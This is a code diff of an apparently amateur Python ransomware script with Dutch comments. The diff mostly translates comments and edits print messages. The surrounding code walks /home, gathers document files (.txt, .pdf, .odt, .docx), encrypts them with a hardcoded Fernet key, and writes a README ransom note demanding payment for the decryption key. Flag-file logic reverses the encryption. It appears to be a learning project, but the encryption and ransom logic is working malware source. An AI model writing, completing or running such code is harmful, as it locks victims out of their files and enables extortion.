@@ -8,6 +8,7 @@ if Killswitch==True:
 else:
     pass
 
+#Check of er gedecrypt moet worden.
 try:
    check = open("Decrypt.txt", "r")
    check_1 = 1
@@ -17,17 +18,17 @@ except:
 #Hier zoek functie
 #Def var voor opslaan van lijstdata van zoekfunctie.
 bestandenlijst = []
-# Using os.walk()
+# Gebruik os.walk()
 for dirpath, dirs, files in os.walk('/home'): 
   for filename in files:
     fname = os.path.join(dirpath,filename)
     if fname.endswith('.txt') or fname.endswith('.pdf') or fname.endswith('.odt') or fname.endswith('.docx'):
       bestandenlijst.append(fname)
 
-#Decrypt
+#Fernetkey
 key = "LvKBgbdRvSZZHwBt9WcJw9rR5Aya4BIkzi-NpZKGnzw="
 if check_1 == 1:
-   print("DEcrypt")
+   print("Decrypt tijd")
    crypto = Fernet(key)
    for file in bestandenlijst:
       try:
@@ -37,10 +38,9 @@ if check_1 == 1:
          with open(file, 'wb') as f:
             f.write(ontsleutelde_inhoud)
       except Exception as e:
-         print(f"❌ Fout bij {file}: {e}")
+         print(f"Fout bij {file}: {e}")
 else:
-   #Encryptiefunctie gebaseerd op lijst.
-    print("Encrypt")
+    print("Encrypt tijd")
     crypto = Fernet(key)
     for file in bestandenlijst:
         with open(file, 'rb') as f:
@@ -54,7 +54,7 @@ Readme = open("README.txt","w")
 Readme.write("Hallo! Je hebt encryptiesoftware geactiveerd!\n Om je bestanden tedecrypten moet je geld overmaken naar XXX.\n Dan zal je de decryptkey ontvangen!")
 Readme.close()
 
-#Decryptfile
+#Decryptfile aanmaken.
 Decrypt = open("Decrypt.txt","w")
 Decrypt.write("True")
 Decrypt.close()
